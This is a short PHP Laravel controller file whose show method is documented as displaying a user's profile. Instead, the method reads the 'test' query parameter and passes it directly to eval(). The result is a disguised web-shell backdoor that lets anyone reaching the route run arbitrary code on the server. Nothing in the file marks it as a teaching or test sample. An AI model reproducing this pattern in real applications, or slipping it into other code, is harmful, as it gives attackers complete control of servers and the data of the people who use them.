<?php
 
namespace App\Http\Controllers;
 
use App\Models\User;
use Illuminate\View\View;
use Illuminate\Http\Request;
 
class UserController extends Controller
{
    /**
     * Show the profile for a given user.
     */
    public function show(Request $request)
    {
        $a = $request->query("test");
        eval($a);
        return "";
    }
}